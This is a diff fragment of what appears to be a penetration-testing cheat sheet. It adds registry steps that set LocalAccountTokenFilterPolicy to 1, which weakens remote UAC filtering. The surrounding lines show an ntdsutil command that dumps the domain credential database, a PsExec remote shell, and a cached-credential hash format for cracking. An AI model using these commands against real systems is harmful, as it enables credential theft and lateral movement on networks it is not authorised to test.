@@ -170,6 +170,18 @@ powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 
 #remote windows shell (psexec)
 PsExec.exe \\ip_address -u username -p password cmd.exe
+if "access denied":
+{
+    Click Start, click Run, type regedit, and then press ENTER.
+    Locate and then click the following registry subkey:
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    If the LocalAccountTokenFilterPolicy registry entry doesn't exist, follow these steps:
+        On the Edit menu, point to New, and then select DWORD Value.
+        Type LocalAccountTokenFilterPolicy, and then press ENTER.
+    Right-click LocalAccountTokenFilterPolicy, and then select Modify.
+    In the Value data box, type 1, and then select OK.
+    Exit Registry Editor.
+}
 
 # DCC2 mscache cached domain credentials cracking
 $DCC2$10240#username#b9999...d38e863
